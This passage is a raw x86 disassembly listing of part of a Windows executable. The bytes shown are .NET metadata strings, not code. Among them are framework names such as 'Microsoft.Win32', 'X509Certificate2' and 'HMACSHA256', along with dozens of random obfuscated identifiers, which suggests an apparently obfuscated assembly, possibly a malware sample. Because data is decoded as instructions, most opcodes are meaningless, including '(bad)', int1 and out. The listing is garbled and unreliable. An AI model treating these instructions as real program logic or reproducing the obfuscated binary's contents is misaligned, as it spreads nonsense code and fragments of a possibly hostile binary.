  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 fe                	add    %bh,%dh
  407705:	16                   	push   %ss
  407706:	f1                   	int1
  407707:	16                   	push   %ss
  407708:	09 17                	or     %edx,(%edi)
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	92                   	xchg   %eax,%edx
  40771b:	24 01                	and    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	9e                   	sahf
  407723:	23 01                	and    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	d9 0d 02 00 41 01    	(bad) 0x1410002
  407730:	77 00                	ja     0x407732
  407732:	ad                   	lods   %ds:(%esi),%eax
  407733:	22 02                	and    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	e9 0f 02 00 40       	jmp    0x4040794e
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	76 16                	jbe    0x40775a
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	2b 00                	sub    (%eax),%eax
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	0f 0a                	(bad)
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	04 00                	add    $0x0,%al
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	a9 17 00 00 00       	test   $0x17,%eax
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 e3                	add    %ah,%bl
  40779f:	13 00                	adc    (%eax),%eax
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	9a 0f 00 00 00 00 0a 	lcall  $0xa00,$0xf
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 75 0a             	add    %dh,0xa(%ebp)
  4077c8:	00 00                	add    %al,(%eax)
  4077ca:	00 00                	add    %al,(%eax)
  4077cc:	04 00                	add    $0x0,%al
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 59 22             	add    %bl,0x22(%ecx)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	e7 1f                	out    %eax,$0x1f
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 10                	add    %dl,(%eax)
  407803:	1b 00                	sbb    (%eax),%eax
  407805:	00 00                	add    %al,(%eax)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	6d                   	insl   (%dx),%es:(%edi)
  407848:	6b 6f 31 00          	imul   $0x0,0x31(%edi),%ebp
  40784c:	4d                   	dec    %ebp
  40784d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407854:	74 2e                	je     0x407884
  407856:	57                   	push   %edi
  407857:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40785e:	55                   	push   %ebp
  40785f:	49                   	dec    %ecx
  407860:	6e                   	outsb  %ds:(%esi),(%dx)
  407861:	74 33                	je     0x407896
  407863:	32 00                	xor    (%eax),%al
  407865:	54                   	push   %esp
  407866:	6f                   	outsl  %ds:(%esi),(%dx)
  407867:	49                   	dec    %ecx
  407868:	6e                   	outsb  %ds:(%esi),(%dx)
  407869:	74 33                	je     0x40789e
  40786b:	32 00                	xor    (%eax),%al
  40786d:	58                   	pop    %eax
  40786e:	35 30 39 43 65       	xor    $0x65433930,%eax
  407873:	72 74                	jb     0x4078e9
  407875:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40787c:	32 00                	xor    (%eax),%al
  40787e:	54                   	push   %esp
  40787f:	6f                   	outsl  %ds:(%esi),(%dx)
  407880:	55                   	push   %ebp
  407881:	49                   	dec    %ecx
  407882:	6e                   	outsb  %ds:(%esi),(%dx)
  407883:	74 36                	je     0x4078bb
  407885:	34 00                	xor    $0x0,%al
  407887:	54                   	push   %esp
  407888:	6f                   	outsl  %ds:(%esi),(%dx)
  407889:	49                   	dec    %ecx
  40788a:	6e                   	outsb  %ds:(%esi),(%dx)
  40788b:	74 36                	je     0x4078c3
  40788d:	34 00                	xor    $0x0,%al
  40788f:	54                   	push   %esp
  407890:	6f                   	outsl  %ds:(%esi),(%dx)
  407891:	55                   	push   %ebp
  407892:	49                   	dec    %ecx
  407893:	6e                   	outsb  %ds:(%esi),(%dx)
  407894:	74 31                	je     0x4078c7
  407896:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789b:	6e                   	outsb  %ds:(%esi),(%dx)
  40789c:	74 31                	je     0x4078cf
  40789e:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a2:	41                   	inc    %ecx
  4078a3:	43                   	inc    %ebx
  4078a4:	53                   	push   %ebx
  4078a5:	48                   	dec    %eax
  4078a6:	41                   	inc    %ecx
  4078a7:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078ad:	74 5f                	je     0x40790e
  4078af:	55                   	push   %ebp
  4078b0:	54                   	push   %esp
  4078b1:	46                   	inc    %esi
  4078b2:	38 00                	cmp    %al,(%eax)
  4078b4:	3c 4d                	cmp    $0x4d,%al
  4078b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b7:	64 75 6c             	fs jne 0x407926
  4078ba:	65 3e 00 44 66 44    	gs add %al,%ds:0x44(%esi,%eiz,2)
  4078c0:	58                   	pop    %eax
  4078c1:	4e                   	dec    %esi
  4078c2:	65 4b                	gs dec %ebx
  4078c4:	6c                   	insb   (%dx),%es:(%edi)
  4078c5:	49                   	dec    %ecx
  4078c6:	44                   	inc    %esp
  4078c7:	79 7a                	jns    0x407943
  4078c9:	4e                   	dec    %esi
  4078ca:	41                   	inc    %ecx
  4078cb:	00 49 57             	add    %cl,0x57(%ecx)
  4078ce:	4f                   	dec    %edi
  4078cf:	50                   	push   %eax
  4078d0:	6c                   	insb   (%dx),%es:(%edi)
  4078d1:	63 6f 73             	arpl   %ebp,0x73(%edi)
  4078d4:	68 41 00 54 4d       	push   $0x4d540041
  4078d9:	52                   	push   %edx
  4078da:	45                   	inc    %ebp
  4078db:	4f                   	dec    %edi
  4078dc:	68 46 63 48 4d       	push   $0x4d486346
  4078e1:	63 4a 42             	arpl   %ecx,0x42(%edx)
  4078e4:	00 47 4a             	add    %al,0x4a(%edi)
  4078e7:	47                   	inc    %edi
  4078e8:	64 44                	fs inc %esp
  4078ea:	6d                   	insl   (%dx),%es:(%edi)
  4078eb:	70 6a                	jo     0x407957
  4078ed:	50                   	push   %eax
  4078ee:	50                   	push   %eax
  4078ef:	6b 4d 42 00          	imul   $0x0,0x42(%ebp),%ecx
  4078f3:	43                   	inc    %ebx
  4078f4:	63 64 51 75          	arpl   %esp,0x75(%ecx,%edx,2)
  4078f8:	41                   	inc    %ecx
  4078f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078fa:	41                   	inc    %ecx
  4078fb:	4a                   	dec    %edx
  4078fc:	6c                   	insb   (%dx),%es:(%edi)
  4078fd:	79 65                	jns    0x407964
  4078ff:	50                   	push   %eax
  407900:	42                   	inc    %edx
  407901:	00 53 63             	add    %dl,0x63(%ebx)
  407904:	41                   	inc    %ecx
  407905:	63 72 77             	arpl   %esi,0x77(%edx)
  407908:	69 77 4f 57 51 42 00 	imul   $0x425157,0x4f(%edi),%esi
  40790f:	4a                   	dec    %edx
  407910:	4b                   	dec    %ebx
  407911:	55                   	push   %ebp
  407912:	79 55                	jns    0x407969
  407914:	78 4c                	js     0x407962
  407916:	41                   	inc    %ecx
  407917:	56                   	push   %esi
  407918:	4d                   	dec    %ebp
  407919:	66 54                	push   %sp
  40791b:	67 65 55             	addr16 gs push %ebp
  40791e:	42                   	inc    %edx
  40791f:	00 57 66             	add    %dl,0x66(%edi)
  407922:	42                   	inc    %edx
  407923:	50                   	push   %eax
  407924:	45                   	inc    %ebp
  407925:	63 59 4a             	arpl   %ebx,0x4a(%ecx)
  407928:	7a 54                	jp     0x40797e
  40792a:	6c                   	insb   (%dx),%es:(%edi)
  40792b:	62 6b 42             	bound  %ebp,0x42(%ebx)
  40792e:	00 7a 66             	add    %bh,0x66(%edx)
  407931:	6a 62                	push   $0x62
  407933:	55                   	push   %ebp
  407934:	68 71 76 6a 61       	push   $0x616a7671
  407939:	42                   	inc    %edx
  40793a:	75 42                	jne    0x40797e
  40793c:	00 79 63             	add    %bh,0x63(%ecx)
  40793f:	43                   	inc    %ebx
  407940:	63 63 6b             	arpl   %esp,0x6b(%ebx)
  407943:	78 4f                	js     0x407994
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	63 6b 76             	arpl   %ebp,0x76(%ebx)
  407949:	42                   	inc    %edx
  40794a:	00 49 65             	add    %cl,0x65(%ecx)
  40794d:	68 74 44 41 61       	push   $0x61414474
  407952:	59                   	pop    %ecx
  407953:	62 51 78             	bound  %edx,0x78(%ecx)
  407956:	42                   	inc    %edx
  407957:	00 77 65             	add    %dh,0x65(%edi)
  40795a:	55                   	push   %ebp
  40795b:	61                   	popa
  40795c:	6f                   	outsl  %ds:(%esi),(%dx)
  40795d:	4f                   	dec    %edi
  40795e:	6b 4d 70 51          	imul   $0x51,0x70(%ebp),%ecx
  407962:	47                   	inc    %edi
  407963:	73 79                	jae    0x4079de
  407965:	42                   	inc    %edx
  407966:	00 55 64             	add    %dl,0x64(%ebp)
  407969:	42                   	inc    %edx
  40796a:	6d                   	insl   (%dx),%es:(%edi)
  40796b:	70 6e                	jo     0x4079db
  40796d:	6b 63 55 52          	imul   $0x52,0x55(%ebx),%esp
  407971:	68 45 43 00 47       	push   $0x47004345
  407976:	43                   	inc    %ebx
  407977:	00 69 59             	add    %ch,0x59(%ecx)
  40797a:	7a 78                	jp     0x4079f4
  40797c:	50                   	push   %eax
  40797d:	78 63                	js     0x4079e2
  40797f:	6b 70 53 4d          	imul   $0x4d,0x53(%eax),%esi
  407983:	4a                   	dec    %edx
  407984:	6c                   	insb   (%dx),%es:(%edi)
  407985:	66 69 4c 43 00 6d 6a 	imul   $0x6a6d,0x0(%ebx,%eax,2),%cx
  40798c:	6b 72 4c 69          	imul   $0x69,0x4c(%edx),%esi
  407990:	54                   	push   %esp
  407991:	56                   	push   %esi
  407992:	4d                   	dec    %ebp
  407993:	50                   	push   %eax
  407994:	51                   	push   %ecx
  407995:	43                   	inc    %ebx
  407996:	00 47 6a             	add    %al,0x6a(%edi)
  407999:	62 71 57             	bound  %esi,0x57(%ecx)
  40799c:	43                   	inc    %ebx
  40799d:	45                   	inc    %ebp
  40799e:	6b 74 6c 51 43       	imul   $0x43,0x51(%esp,%ebp,2),%esi
  4079a3:	00 55 6f             	add    %dl,0x6f(%ebp)
  4079a6:	58                   	pop    %eax
  4079a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a8:	5a                   	pop    %edx
  4079a9:	6b 57 7a 68          	imul   $0x68,0x7a(%edi),%edx
  4079ad:	43                   	inc    %ebx
  4079ae:	00 65 71             	add    %ah,0x71(%ebp)
  4079b1:	69 43 50 75 68 57 6d 	imul   $0x6d576875,0x50(%ebx),%eax
  4079b8:	76 55                	jbe    0x407a0f
  4079ba:	64 6e                	outsb  %fs:(%esi),(%dx)
  4079bc:	43                   	inc    %ebx
  4079bd:	00 65 54             	add    %ah,0x54(%ebp)
  4079c0:	50                   	push   %eax
  4079c1:	74 6d                	je     0x407a30
  4079c3:	66 44                	inc    %sp
  4079c5:	7a 73                	jp     0x407a3a
  4079c7:	43                   	inc    %ebx
  4079c8:	00 4f 6c             	add    %cl,0x6c(%edi)
  4079cb:	64 64 4f             	fs fs dec %edi
  4079ce:	75 4e                	jne    0x407a1e
  4079d0:	57                   	push   %edi
  4079d1:	6b 69 73 63          	imul   $0x63,0x73(%ecx),%ebp
  4079d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4079d7:	64 41                	fs inc %ecx
  4079d9:	44                   	inc    %esp
  4079da:	00 4d 61             	add    %cl,0x61(%ebp)
  4079dd:	70 4e                	jo     0x407a2d
  4079df:	61                   	popa
  4079e0:	6d                   	insl   (%dx),%es:(%edi)
  4079e1:	65 54                	gs push %esp
  4079e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e4:	4f                   	dec    %edi
  4079e5:	49                   	dec    %ecx
  4079e6:	44                   	inc    %esp
  4079e7:	00 67 65             	add    %ah,0x65(%edi)
  4079ea:	74 5f                	je     0x407a4b
  4079ec:	46                   	inc    %esi
  4079ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ee:	72 6d                	jb     0x407a5d
  4079f0:	61                   	popa
  4079f1:	74 49                	je     0x407a3c
  4079f3:	44                   	inc    %esp
  4079f4:	00 4c 54 65          	add    %cl,0x65(%esp,%edx,2)
  4079f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f9:	77 69                	ja     0x407a64
  4079fb:	45                   	inc    %ebp
  4079fc:	50                   	push   %eax
  4079fd:	4c                   	dec    %esp
  4079fe:	49                   	dec    %ecx
  4079ff:	76 76                	jbe    0x407a77
  407a01:	69 44 00 43 68 4c 67 	imul   $0x4d674c68,0x43(%eax,%eax,1),%eax
  407a08:	4d 
  407a09:	61                   	popa
  407a0a:	65 44                	gs inc %esp
  407a0c:	74 6d                	je     0x407a7b
  407a0e:	44                   	inc    %esp
  407a0f:	00 50 43             	add    %dl,0x43(%eax)
  407a12:	61                   	popa
  407a13:	54                   	push   %esp
  407a14:	66 41                	inc    %cx
  407a16:	6b 45 54 6d          	imul   $0x6d,0x54(%ebp),%eax
  407a1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407a1b:	58                   	pop    %eax
  407a1c:	44                   	inc    %esp
  407a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1e:	44                   	inc    %esp
  407a1f:	00 6c 44 77          	add    %ch,0x77(%esp,%eax,2)
  407a23:	63 6c 78 58          	arpl   %ebp,0x58(%eax,%edi,2)
  407a27:	4f                   	dec    %edi
  407a28:	7a 52                	jp     0x407a7c
  407a2a:	45                   	inc    %ebp
  407a2b:	00 64 52 66          	add    %ah,0x66(%edx,%edx,2)
  407a2f:	59                   	pop    %ecx
  407a30:	69 6a 68 59 4b 65 45 	imul   $0x45654b59,0x68(%edx),%ebp
  407a37:	00 63 75             	add    %ah,0x75(%ebx)
  407a3a:	6a 59                	push   $0x59
  407a3c:	6d                   	insl   (%dx),%es:(%edi)
  407a3d:	4f                   	dec    %edi
  407a3e:	73 43                	jae    0x407a83
  407a40:	67 65 58             	addr16 gs pop %eax
  407a43:	6e                   	outsb  %ds:(%esi),(%dx)
  407a44:	68 45 00 7a 6a       	push   $0x6a7a0045
  407a49:	69 7a 74 71 71 57 52 	imul   $0x52577171,0x74(%edx),%edi
  407a50:	7a 46                	jp     0x407a98
  407a52:	6a 6b                	push   $0x6b
  407a54:	45                   	inc    %ebp
  407a55:	00 43 6b             	add    %al,0x6b(%ebx)
  407a58:	6c                   	insb   (%dx),%es:(%edi)
  407a59:	78 78                	js     0x407ad3
  407a5b:	66 6c                	data16 insb (%dx),%es:(%edi)
  407a5d:	66 42                	inc    %dx
  407a5f:	69 6d 6f 45 00 52 52 	imul   $0x52520045,0x6f(%ebp),%ebp
  407a66:	54                   	push   %esp
  407a67:	70 71                	jo     0x407ada
  407a69:	48                   	dec    %eax
  407a6a:	42                   	inc    %edx
  407a6b:	67 69 69 74 6f 45 00 	imul   $0x4400456f,0x74(%bx,%di),%ebp
  407a72:	44 
  407a73:	4d                   	dec    %ebp
  407a74:	47                   	inc    %edi
  407a75:	42                   	inc    %edx
  407a76:	45                   	inc    %ebp
  407a77:	4b                   	dec    %ebx
  407a78:	42                   	inc    %edx
  407a79:	64 67 6d             	fs insl (%dx),%es:(%di)
  407a7c:	41                   	inc    %ecx
  407a7d:	64 72 45             	fs jb  0x407ac5
  407a80:	00 53 69             	add    %dl,0x69(%ebx)
  407a83:	4c                   	dec    %esp
  407a84:	46                   	inc    %esi
  407a85:	56                   	push   %esi
  407a86:	6b 48 71 58          	imul   $0x58,0x71(%eax),%ecx
  407a8a:	6e                   	outsb  %ds:(%esi),(%dx)
  407a8b:	72 72                	jb     0x407aff
  407a8d:	45                   	inc    %ebp
  407a8e:	00 62 6b             	add    %ah,0x6b(%edx)
  407a91:	68 52 43 51 56       	push   $0x56514352
  407a96:	6f                   	outsl  %ds:(%esi),(%dx)
  407a97:	4d                   	dec    %ebp
  407a98:	48                   	dec    %eax
  407a99:	73 45                	jae    0x407ae0
  407a9b:	00 56 76             	add    %dl,0x76(%esi)
  407a9e:	42                   	inc    %edx
  407a9f:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa0:	7a 46                	jp     0x407ae8
  407aa2:	6f                   	outsl  %ds:(%esi),(%dx)
  407aa3:	6a 75                	push   $0x75
  407aa5:	76 45                	jbe    0x407aec
  407aa7:	00 45 69             	add    %al,0x69(%ebp)
  407aaa:	43                   	inc    %ebx
  407aab:	77 57                	ja     0x407b04
  407aad:	66 4f                	dec    %di
  407aaf:	41                   	inc    %ecx
  407ab0:	4e                   	dec    %esi
  407ab1:	73 6e                	jae    0x407b21
  407ab3:	6b 43 46 00          	imul   $0x0,0x46(%ebx),%eax
  407ab7:	71 64                	jno    0x407b1d
  407ab9:	54                   	push   %esp
  407aba:	64 6c                	fs insb (%dx),%es:(%edi)
  407abc:	41                   	inc    %ecx
  407abd:	4d                   	dec    %ebp
  407abe:	41                   	inc    %ecx
  407abf:	58                   	pop    %eax
  407ac0:	61                   	popa
  407ac1:	59                   	pop    %ecx
  407ac2:	46                   	inc    %esi
  407ac3:	46                   	inc    %esi
  407ac4:	00 46 6d             	add    %al,0x6d(%esi)
  407ac7:	51                   	push   %ecx
  407ac8:	48                   	dec    %eax
  407ac9:	6e                   	outsb  %ds:(%esi),(%dx)
  407aca:	43                   	inc    %ebx
  407acb:	71 67                	jno    0x407b34
  407acd:	70 4c                	jo     0x407b1b
  407acf:	46                   	inc    %esi
  407ad0:	00 63 41             	add    %ah,0x41(%ebx)
  407ad3:	73 47                	jae    0x407b1c
  407ad5:	49                   	dec    %ecx
  407ad6:	61                   	popa
  407ad7:	57                   	push   %edi
  407ad8:	57                   	push   %edi
  407ad9:	4f                   	dec    %edi
  407ada:	46                   	inc    %esi
  407adb:	00 4d 69             	add    %cl,0x69(%ebp)
  407ade:	49                   	dec    %ecx
  407adf:	4a                   	dec    %edx
  407ae0:	65 71 57             	gs jno 0x407b3a
  407ae3:	75 73                	jne    0x407b58
  407ae5:	41                   	inc    %ecx
  407ae6:	44                   	inc    %esp
  407ae7:	47                   	inc    %edi
  407ae8:	00 44 69 55          	add    %al,0x55(%ecx,%ebp,2)
  407aec:	71 64                	jno    0x407b52
  407aee:	67 5a                	addr16 pop %edx
  407af0:	78 49                	js     0x407b3b
  407af2:	47                   	inc    %edi
  407af3:	00 55 51             	add    %dl,0x51(%ebp)
  407af6:	48                   	dec    %eax
  407af7:	51                   	push   %ecx
  407af8:	70 73                	jo     0x407b6d
  407afa:	75 47                	jne    0x407b43
  407afc:	65 51                	gs push %ecx
  407afe:	47                   	inc    %edi
  407aff:	00 4f 55             	add    %cl,0x55(%edi)
  407b02:	4c                   	dec    %esp
  407b03:	5a                   	pop    %edx
  407b04:	77 4f                	ja     0x407b55
  407b06:	62 72 7a             	bound  %esi,0x7a(%edx)
  407b09:	57                   	push   %edi
  407b0a:	47                   	inc    %edi
  407b0b:	00 64 4a 74          	add    %ah,0x74(%edx,%ecx,2)
  407b0f:	4f                   	dec    %edi
  407b10:	6a 69                	push   $0x69
  407b12:	42                   	inc    %edx
  407b13:	64 6b 61 47 00       	imul   $0x0,%fs:0x47(%ecx),%esp
  407b18:	53                   	push   %ebx
  407b19:	64 50                	fs push %eax
  407b1b:	73 6d                	jae    0x407b8a
  407b1d:	78 69                	js     0x407b88
  407b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b20:	61                   	popa
  407b21:	47                   	inc    %edi
  407b22:	00 66 77             	add    %ah,0x77(%esi)
  407b25:	66 5a                	pop    %dx
  407b27:	72 6b                	jb     0x407b94
  407b29:	57                   	push   %edi
  407b2a:	73 56                	jae    0x407b82
  407b2c:	4e                   	dec    %esi
  407b2d:	4a                   	dec    %edx
  407b2e:	6d                   	insl   (%dx),%es:(%edi)
  407b2f:	53                   	push   %ebx
  407b30:	72 47                	jb     0x407b79
  407b32:	00 67 55             	add    %ah,0x55(%edi)
  407b35:	58                   	pop    %eax
  407b36:	43                   	inc    %ebx
  407b37:	68 57 42 67 45       	push   $0x45674257
  407b3c:	61                   	popa
  407b3d:	79 47                	jns    0x407b86
  407b3f:	00 6d 51             	add    %ch,0x51(%ebp)
  407b42:	75 73                	jne    0x407bb7
  407b44:	53                   	push   %ebx
  407b45:	4b                   	dec    %ebx
  407b46:	4c                   	dec    %esp
  407b47:	43                   	inc    %ebx
  407b48:	76 75                	jbe    0x407bbf
  407b4a:	41                   	inc    %ecx
  407b4b:	52                   	push   %edx
  407b4c:	45                   	inc    %ebp
  407b4d:	48                   	dec    %eax
  407b4e:	00 4f 43             	add    %cl,0x43(%edi)
  407b51:	59                   	pop    %ecx
  407b52:	6d                   	insl   (%dx),%es:(%edi)
  407b53:	69 44 4c 6b 70 50 48 	imul   $0x485070,0x6b(%esp,%ecx,2),%eax
  407b5a:	00 
  407b5b:	73 4e                	jae    0x407bab
  407b5d:	4e                   	dec    %esi
  407b5e:	7a 62                	jp     0x407bc2
  407b60:	54                   	push   %esp
  407b61:	64 49                	fs dec %ecx
  407b63:	54                   	push   %esp
  407b64:	63 55 48             	arpl   %edx,0x48(%ebp)
  407b67:	00 64 67 64          	add    %ah,0x64(%edi,%eiz,2)
  407b6b:	79 45                	jns    0x407bb2
  407b6d:	70 5a                	jo     0x407bc9
  407b6f:	61                   	popa
  407b70:	70 54                	jo     0x407bc6
  407b72:	47                   	inc    %edi
  407b73:	59                   	pop    %ecx
  407b74:	48                   	dec    %eax
  407b75:	00 61 4e             	add    %ah,0x4e(%ecx)
  407b78:	57                   	push   %edi
  407b79:	69 4a 41 44 65 44 78 	imul   $0x78446544,0x41(%edx),%ecx
  407b80:	57                   	push   %edi
  407b81:	64 48                	fs dec %eax
  407b83:	00 54 43 54          	add    %dl,0x54(%ebx,%eax,2)
  407b87:	70 58                	jo     0x407be1
  407b89:	76 73                	jbe    0x407bfe
  407b8b:	55                   	push   %ebp
  407b8c:	6c                   	insb   (%dx),%es:(%edi)
  407b8d:	6e                   	outsb  %ds:(%esi),(%dx)
  407b8e:	76 44                	jbe    0x407bd4
  407b90:	45                   	inc    %ebp
  407b91:	6b 48 00 55          	imul   $0x55,0x0(%eax),%ecx
  407b95:	77 5a                	ja     0x407bf1
  407b97:	66 53                	push   %bx
  407b99:	6c                   	insb   (%dx),%es:(%edi)
  407b9a:	6d                   	insl   (%dx),%es:(%edi)
  407b9b:	4d                   	dec    %ebp
  407b9c:	4a                   	dec    %edx
  407b9d:	41                   	inc    %ecx
  407b9e:	55                   	push   %ebp
  407b9f:	4e                   	dec    %esi
  407ba0:	4f                   	dec    %edi
  407ba1:	74 48                	je     0x407beb
  407ba3:	00 50 43             	add    %dl,0x43(%eax)
  407ba6:	70 52                	jo     0x407bfa
  407ba8:	46                   	inc    %esi
  407ba9:	41                   	inc    %ecx
  407baa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bab:	61                   	popa
  407bac:	48                   	dec    %eax
  407bad:	47                   	inc    %edi
  407bae:	7a 48                	jp     0x407bf8
  407bb0:	00 67 65             	add    %ah,0x65(%edi)
  407bb3:	74 5f                	je     0x407c14
  407bb5:	41                   	inc    %ecx
  407bb6:	53                   	push   %ebx
  407bb7:	43                   	inc    %ebx
  407bb8:	49                   	dec    %ecx
  407bb9:	49                   	dec    %ecx
  407bba:	00 6e 79             	add    %ch,0x79(%esi)
  407bbd:	6a 4b                	push   $0x4b
  407bbf:	59                   	pop    %ecx
  407bc0:	52                   	push   %edx
  407bc1:	64 52                	fs push %edx
  407bc3:	62 64 4a 52          	bound  %esp,0x52(%edx,%ecx,2)
  407bc7:	49                   	dec    %ecx
  407bc8:	00 42 53             	add    %al,0x53(%edx)
  407bcb:	6c                   	insb   (%dx),%es:(%edi)
  407bcc:	45                   	inc    %ebp
  407bcd:	50                   	push   %eax
  407bce:	62 66 57             	bound  %esp,0x57(%esi)
  407bd1:	6b 49 00 68          	imul   $0x68,0x0(%ecx),%ecx
  407bd5:	6b 53 7a 49          	imul   $0x49,0x7a(%ebx),%edx
  407bd9:	63 41 50             	arpl   %eax,0x50(%ecx)
  407bdc:	46                   	inc    %esi
  407bdd:	57                   	push   %edi
  407bde:	4f                   	dec    %edi
  407bdf:	74 49                	je     0x407c2a
  407be1:	00 64 79 67          	add    %ah,0x67(%ecx,%edi,2)
  407be5:	4b                   	dec    %ebx
  407be6:	75 55                	jne    0x407c3d
  407be8:	6d                   	insl   (%dx),%es:(%edi)
  407be9:	72 5a                	jb     0x407c45
  407beb:	78 49                	js     0x407c36
  407bed:	00 6a 4d             	add    %ch,0x4d(%edx)
  407bf0:	4d                   	dec    %ebp
  407bf1:	6b 66 73 76          	imul   $0x76,0x73(%esi),%esp
  407bf5:	70 65                	jo     0x407c5c
  407bf7:	65 73 46             	gs jae 0x407c40
  407bfa:	41                   	inc    %ecx
  407bfb:	4a                   	dec    %edx
  407bfc:	00 57 6f             	add    %dl,0x6f(%edi)
  407bff:	57                   	push   %edi
  407c00:	53                   	push   %ebx
  407c01:	6e                   	outsb  %ds:(%esi),(%dx)
  407c02:	47                   	inc    %edi
  407c03:	43                   	inc    %ebx
  407c04:	6e                   	outsb  %ds:(%esi),(%dx)
  407c05:	6a 6e                	push   $0x6e
  407c07:	79 4a                	jns    0x407c53
  407c09:	4c                   	dec    %esp
  407c0a:	4b                   	dec    %ebx
  407c0b:	4a                   	dec    %edx
  407c0c:	00 71 56             	add    %dh,0x56(%ecx)
  407c0f:	73 58                	jae    0x407c69
  407c11:	62 42 44             	bound  %eax,0x44(%edx)
  407c14:	6f                   	outsl  %ds:(%esi),(%dx)
